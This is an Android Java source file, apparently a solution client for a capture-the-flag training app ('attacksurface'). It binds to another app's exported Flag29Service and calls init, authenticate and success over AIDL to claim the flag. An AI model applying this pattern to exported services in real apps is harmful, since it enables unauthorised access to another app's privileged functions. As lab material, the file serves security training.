package io.hextree.aidl_client;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        ServiceConnection serviceConncection =  new ServiceConnection() {
            @Override
            public void onServiceConnected(ComponentName name, IBinder service) {
                IFlag29Interface flag = IFlag29Interface.Stub.asInterface(service);

                try {
                    Log.i("FLAG28", "onServiceConnected:");
                    String pass = flag.init();
                } catch (RemoteException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                Log.i("FLAG28", "onServiceDisconnected fired!");
            }

        };

        findViewById(R.id.button).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Log.i("FLAG28", "onClick");
                Intent intent = new Intent();
                intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag29Service");
                ServiceConnection serviceConncection =  new ServiceConnection() {
                    @Override
                    public void onServiceConnected(ComponentName name, IBinder service) {

                        IFlag29Interface flag = IFlag29Interface.Stub.asInterface(service);
                        try {
                            Log.i("FLAG28", "onServiceConnected:");
                            String pass = flag.init();
                            flag.authenticate(pass);
                            flag.success();
                        } catch (RemoteException e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onServiceDisconnected(ComponentName name) {
                        Log.i("FLAG28", "onServiceDisconnected fired!");
                    }
                    @Override
                    public void onBindingDied(ComponentName name) {
                        Log.i("FLAG28", "onBindingDied fired!"); // ← binding failed
                    }

                    @Override
                    public void onNullBinding(ComponentName name) {
                        Log.i("FLAG28", "onNullBinding fired!"); // ← onBind returned null
                    }
                };

                Log.i("FLAG28", "Binding service");
                boolean bound =  bindService(intent, serviceConncection, Context.BIND_AUTO_CREATE);
                Log.i("FLAG28", "bindService returned: " + bound);
            }
        });
    }
}